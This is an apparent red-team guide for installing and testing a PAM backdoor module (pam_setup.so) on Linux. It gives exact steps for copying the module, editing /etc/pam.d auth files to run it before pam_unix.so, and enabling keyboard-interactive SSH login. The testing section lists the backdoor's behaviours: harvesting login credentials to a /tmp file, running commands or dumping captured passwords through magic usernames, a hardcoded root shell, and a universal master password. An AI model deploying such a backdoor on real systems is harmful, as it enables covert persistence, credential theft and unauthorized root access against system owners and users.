Installing the red team PAM backdoor:
1. Find where the PAM modules are stored (usually /lib/security, or /lib/x86_64-linux-gnu/security, or etc.).
2. Copy pam_setup.so into the folder with the rest of the PAM modules.
3. Ensure the owner and permissions match the other modules (chown and chmod as necessary)
4. Find the "common auth" file in /etc/pam.d, typically common-auth or system-auth. If necessary, look for
    "include" entries in /etc/pam.d/login or /etc/pam.d/sshd.
5. In the auth file (from previous step), find the line that contains "auth" and "pam_unix.so", and
    append "try_first_pass" to the end of the entry (if it isn't already there).
	* NOTE: If the entry does not have "success=1" inside square brackets, talk to Chris for assistance.
6. Put the following entry on the line above the "pam_unix.so" entry, matching tabs/spaces with the other lines:
    -auth [success=2 default=ignore] pam_setup.so
7. Ensure /etc/ssh/sshd_config has "KbdInteractiveAuthentication yes" (formerly ChallengeResponseAuthentication).

Testing (post-install):
1. Login with any user, then verify that /tmp/.cred-1000 contains your login credentials. Also verify that you were only
    asked for a password one time (e.g. "Password:" only appeared once).
2. At the login prompt, use the username "mandy" and then use "ls /var" as the password. You should see the files in /var.
3. At the login prompt, use the username "creed" and any password, you should see the contents of /tmp/.cred-1000 dumped.
4. At the login prompt, use the username "shelly" with password "shazam", you should get a root shell.
5. At the login prompt, pick any valid username and use "SpookyScarySkeletons" as the password. You should be logged in.

NOTE:
After field deployment, learned that SSH pre-searches for username before passing it off to PAM,
 and passes a default string if the username is not a valid user. Either create these users
 or change source to match an existing user.
